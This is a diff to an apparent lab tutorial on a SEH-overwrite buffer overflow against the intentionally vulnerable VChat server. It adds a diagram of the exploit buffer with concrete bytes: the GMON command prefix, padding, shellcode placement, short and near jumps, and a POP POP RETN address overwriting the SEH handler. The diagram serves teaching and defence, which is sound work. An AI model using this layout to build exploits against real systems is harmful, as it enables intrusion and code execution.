@@ -361,6 +361,27 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 
       <img src="Images/exploit1-exploit.png" width=600>
 
+```
+    |                                    |<-- High address
+    |------------------------------------|
+--> | b'\xe9\x02\xf2\xff\xff'            | # JMP to shellcode ----------------------------
+|   |------------------------------------|                                                |
+|   | Padding                            |                                                |
+|   |------------------------------------|                                                |
+|   | 0x6250271B (POP R32; POP R32; RETN | # Overwriting SEH handler; RETN will run ----  |
+|   |------------------------------------|                                             |  |
+|   | b'\x90\x90'                        | # Padding                                   |  |
+|   |------------------------------------|                                             |  |
+|<--| b'\xeb\x08' (JMP SHORT +0xa)       |                                             |  |
+    |------------------------------------|<---------------------------------------------  |
+    | b'A' * (3571 - 4 - len(SHELL))     | # Padding                                      |
+    |------------------------------------|                                                |
+    | SHELL                              |                                                |
+    |------------------------------------|<------------------------------------------------
+    | b'GMON /.:/'                       |
+    |------------------------------------|
+    |                                    |<- Low address
+```
 
 ## Attack Mitigation Table
 In this section we will discuss the effects a variety of defenses would have on *this specific attack* on the VChat server, specifically we will be discussing their effects on a buffer overflow that overwrites a SEH record and attempts to execute shellcode that has been written to the stack. We will make a note that some mitigations may be bypassed if the target application contains additional vulnerabilities such as a [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack), or by using more complex exploits like [Return Oriented Programming (ROP)](https://github.com/DaintyJet/VChat_TRUN_ROP).
